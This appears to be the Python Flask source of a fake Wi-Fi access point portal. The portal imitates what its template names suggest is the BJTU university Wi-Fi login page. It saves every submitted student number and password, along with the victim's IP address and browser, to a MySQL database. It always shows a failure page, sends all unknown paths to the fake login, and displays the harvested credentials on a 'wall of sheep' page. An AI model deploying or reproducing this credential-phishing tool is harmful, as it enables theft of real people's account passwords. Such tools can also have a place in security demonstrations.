# !/usr/bin/env python
#  -*- coding: utf-8 -*-
from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
import datetime


class Config:
    DEBUG = True
    SQLALCHEMY_TRACK_MODIFICATIONS = True
    SQLALCHEMY_DATABASE_URI = "mysql+pymysql://root:root@127.0.0.1:3306/fakeap"


app = Flask(__name__)
app.config.from_object(Config)
db = SQLAlchemy()
db.init_app(app)


class Wifi(db.Model):
    id = db.Column(db.Integer(), primary_key=True, autoincrement=True)
    remote_addr = db.Column(db.String(255))
    remote_user = db.Column(db.String(255))
    username = db.Column(db.String(255))
    password = db.Column(db.String(20))
    create_time = db.Column(db.DateTime())

    def __repr__(self):
        return "<PostData '%s'>" % self.id


@app.route('/login.html', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        post_data = request.form.to_dict()
        print post_data
        if check_data(post_data):
            data = Wifi()
            data.remote_user = request.user_agent.string
            data.remote_addr = request.remote_addr
            data.username = post_data['username']
            data.password = post_data['password']
            data.create_time = datetime.datetime.now()
            db.session.add(data)
            db.session.commit()
            print data
        return render_template('bjtu_wifi_old_fail.html')
    return render_template('bjtu_wifi_old.html')


@app.errorhandler(404)
def handle404(e):
    return redirect('/login.html')


@app.route('/sheep')
def sheep():
    data = Wifi.query.order_by(Wifi.create_time.desc()).all()
    for each in data:
        each.password = each.password[0] + ''.join(['*' for i in range(len(each.password) - 2)]) + each.password[-1]
    return render_template('wall_of_sheep.html', data=data)


def check_data(data):
    if not data or 'username' not in data or 'password' not in data:
        return False
    if len(data['username']) != 8:
        return False
    if len(data['password']) < 6:
        return False
    try:
        int(data['username'])
    except:
        return False
    return True
